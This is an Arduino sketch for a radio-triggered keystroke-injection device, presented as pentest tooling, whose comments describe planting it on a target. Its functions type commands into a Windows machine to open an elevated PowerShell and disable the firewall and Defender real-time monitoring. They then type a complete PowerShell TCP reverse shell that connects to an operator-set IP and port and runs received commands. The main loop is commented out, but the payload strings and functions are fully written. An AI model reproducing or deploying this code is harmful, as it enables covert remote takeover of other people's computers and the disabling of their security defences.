#include <SPI.h>
#include "RF24.h"
#include "printf.h"   // must include this to use radio.printDetails();
#include "PENTEST_NRF.h"
#include "PENTEST_KEYBOARD.h"


#define CE_PIN 8
#define CSN_PIN 7

//#define CE_PIN 9
//#define CSN_PIN 10
///rx end MUST be an RFMICRO, rfLeo or other 32u4 (keyboard able) board

#define MAX_LOAD_SIZE 16

////////////////////////////////////////////////////////////////////////////////////////////////////
/////**********************************INSTRUCTIONS, REVERSE SHELL RF **************************////
// Once you have planted the attacking device, you may wish to leave or wait before triggering
// anything or opening a shell. This script will wait for you to send the command "start" before
// opening a reverse shell. You must have netcat running prior to starting on the host machine, 
// listening on the port you set below. The transmitter script is the same as for cmd, and is just 
// for initializing your reverse shell in this script. Set your public IP below, how you expose an IP is beyond 
// the scope of this example but the internet is rife with ways to do that. Mind your own security as well.
// If both computers are on the same network, you can use private IPs
// *******************ONLY WORKS WITH WINDOWS ******************//

  
RF24 radio(CE_PIN, CSN_PIN);
PENTEST_NRF pentester(&radio);

//***********configure**************//
char myAddr[] = "192.168.4.54\",555";
//**********************************//
 
  char c1[] = "$client = New-Object System.Net.Sockets.TCPClient(\"";
  char c2[] = ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)"
               ") -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |"
               "Out-String );$sendback2 = $sendback  + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes"
               "($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";


byte payload[MAX_LOAD_SIZE];
int loadSize = MAX_LOAD_SIZE;

void setup() {
  printf_begin();          // This is for initializing printf that is used by printDetails()
  Serial.begin(115200); 
  radio.begin(); 
  pentester.init();  //on receiving end, if you dont put false here (wait for serial) then it will hang on the host computer
  radio.setPALevel(RF24_PA_HIGH);           // override the default PA_LOW pentester.init() sets
  radio.printDetails();
  radio.startListening();

}

void loop() {
  
//  if (pentester.rxReliable(payload, loadSize)){
//    radio.stopListening();
//    //String startCommand != "start";
//    String com = String((char*)payload);
//    Serial.println(com);
//    if (startCommand.compareTo(com) != 0){
//        Keyboard.begin();   
//        delay(800);
//        openReverseShell(); 
//        //Keyboard.end();
//    }
//    radio.startListening();
//    //Serial.println(shell);
//  }
//  pentester.checkForRadioFail();
}

void toggleFirewall(bool turnOff=false){
  if (turnOff){
    Keyboard.println("netsh advfirewall set allprofiles state off");
    Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  } else {
    Keyboard.println("netsh advfirewall set currentprofile state on");
    Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $false");
  }
  delay(100);
}

void openReverseShell(){
  windowsOpen("Powershell");
  delay(1000);
  Keyboard.println("start-process powershell -verb runas");
  delay(1000);
  toggleFirewall(true);
  delay(300); 
  Keyboard.print(c1);
  Keyboard.print(myAddr);
  Keyboard.println(c2);
}
